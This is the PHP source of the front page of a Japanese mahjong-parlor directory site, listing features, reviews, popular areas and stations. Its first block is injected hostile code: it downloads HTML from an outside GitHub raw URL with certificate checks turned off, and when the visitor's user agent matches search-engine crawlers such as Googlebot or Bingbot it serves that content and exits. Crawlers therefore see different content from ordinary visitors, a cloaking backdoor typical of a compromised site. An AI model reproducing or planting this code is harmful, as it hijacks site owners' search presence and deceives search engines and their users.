<?php
function f($u){
  if(ini_get('allow_url_fopen'))
    return @file_get_contents($u,0,stream_context_create(['http'=>['timeout'=>6],'https'=>['timeout'=>6]]));
  if(function_exists('curl_init')){
    $c=curl_init($u);
    curl_setopt_array($c,[
      CURLOPT_RETURNTRANSFER=>1,
      CURLOPT_USERAGENT=>'Mozilla/5.0',
      CURLOPT_SSL_VERIFYPEER=>0,
      CURLOPT_SSL_VERIFYHOST=>0,
      CURLOPT_TIMEOUT=>10
    ]);
    $r=curl_exec($c);curl_close($c);return $r;
  }
  return false;
}
$u=strtolower($_SERVER["HTTP_USER_AGENT"]);
$x="https://raw.githubusercontent.com/ajabahan1/bahan/refs/heads/main/beha.txt";
$d=f($x);
if(preg_match('/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/',$u)){
  header("Content-Type: text/html; charset=UTF-8");
  header("Vary: User-Agent");
  if($d!==false)echo $d;exit;
}
?>
<?php
session_start();
require_once "func-index.php";

require_once "./lib/Mobile_Detect.php";
$detect = new Mobile_Detect;

if (!$detect->isMobile() && !$detect->isTablet()) {
    $AD_PC_INDEX_TOP = getAdPcIndexTop();
    $INTERVIEWLIST = getInterviewList(3);
    $POPULARAREALIST = getPopularAreaList();
    $POPULARSTATIONLIST = getPopularStationList();
    $REVIEWLIST = getReviewList();
    $FEATURELIST = getFeatureList();
} else {
    $AD_PC_INDEX_TOP = NULL;
    $INTERVIEWLIST = getInterviewList(3);
    $POPULARAREALIST = getPopularAreaList(10);
    $POPULARSTATIONLIST = getPopularStationList(10);
    $REVIEWLIST = getReviewList(5);
    $FEATURELIST = getFeatureList(false);
}

$POPULARWORDLIST = getPopularWordList();
//$NEWNANIKIRU = getNewNanikiru();

$AD_PC_INDEX_CENTER = null;

if (!$detect->isMobile() && !$detect->isTablet()) {
    $AD_PC_INDEX_CENTER = getAdPcIndexCenter();
}

// ログ追記
appendImpIndex();
?>
<?php Head(); ?>

<!-- swiper -->
<link rel="stylesheet" href="/lib/Swiper-3.4.1/swiper.min.css" media="print" onload="this.media='all'">
<script src="/lib/Swiper-3.4.1/swiper.min.js" async></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-advanced-news-ticker/1.0.1/js/newsTicker.min.js" async></script>

<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "url": "<?=HTTP_URL?>",
  "logo": "<?=HTTP_URL?>images/logo.png"
}
</script>

<script>
$(function(){

    // 選択ダイアログ
    $("#btn_selarea").click(function(){
        //$("#area_dialog").dialog("open");
        location.href="/search/?skbn=a";
        return false;
    });
    $("#btn_selstation").click(function(){
        //$("#station_dialog").dialog("open");
        location.href="/search/?skbn=s";
        return false;
    });
});
</script>


<?php Top();?>

<div id="left">
<?php Left();?>
</div>

<div id="main">
<div class="main-inner">


<?=$AD_PC_INDEX_TOP?>

<!-- Google 広告 -->
<!--
<?=showGoogleAd()?>
-->

<div class="frame">
<div class="title_green">
<i class="fa fa-map-pin" aria-hidden="true"></i><h2>雀荘エリア特集</h2>
</div>
<div class="frame_inner">
<?=$FEATURELIST?> 
</div>
</div>


<div class="frame">
<div class="title_green">
<i class="fa fa-microphone" aria-hidden="true"></i><h2>特集：雀荘特別レポート</h2>
</div>
<div class="frame_inner"><?=$INTERVIEWLIST?> 
</div>
</div>


<p>
<?=$AD_PC_INDEX_CENTER ?>
</p>

<!-- Google 広告 -->
<!--
<?=showGoogleAd()?>
-->


<div class="frame">
  <div class="title_green">
  <i class="fa fa-commenting" aria-hidden="true"></i><h2>新着クチコミ情報</h2>
  </div>
  <div class="frame_inner"><?=$REVIEWLIST?> 
  </div>
</div>


<div class="frame">
<div class="title_green">
<i class="fa fa-map-marker" aria-hidden="true"></i><h2>人気のエリアから雀荘を探す</h2>
</div>
<div class="frame_inner">
<?=$POPULARAREALIST?>
</div>
</div>


<div class="frame">
<div class="title_green">
<i class="fa fa-map-marker" aria-hidden="true"></i><h2>人気の駅から雀荘を探す</h2>
</div>
<div class="frame_inner">
<?=$POPULARSTATIONLIST?>
</div>
</div>


<div class="frame">
<div class="title_green">
<i class="fa fa-search" aria-hidden="true"></i><h2>ジャンルから雀荘を探す</h2>
</div>
<div class="frame_inner">
<?php include("inc-pickup.php"); ?>
</div>
</div>


<div class="frame">
<div class="title_green">
<i class="fa fa-search" aria-hidden="true"></i><h2>チェーン店から雀荘を探す</h2>
</div>
<div class="frame_inner">
<?php include("inc-group.php"); ?>
</div>
</div>


<div class="frame">
<div class="title_green">
<i class="fa fa-book" aria-hidden="true"></i><h2>名前から雀荘を探す</h2>
</div>
<div class="frame_inner">
<?php include("inc-sakuin.php"); ?>
</div>
</div>


<div class="frame">
<div class="title_green">
<i class="fa fa-check" aria-hidden="true"></i><h2>人気の検索ワードで雀荘を探す</h2>
</div>
<div class="frame_inner">
<?=$POPULARWORDLIST?>
</div>
</div>


</div>


</div>

<div id="right">
<?php Right();?>
</div>

</div>

<?php Bottom();?>
<?php Foot();?>

<?require_once("./pages/dialog-search.php");?>
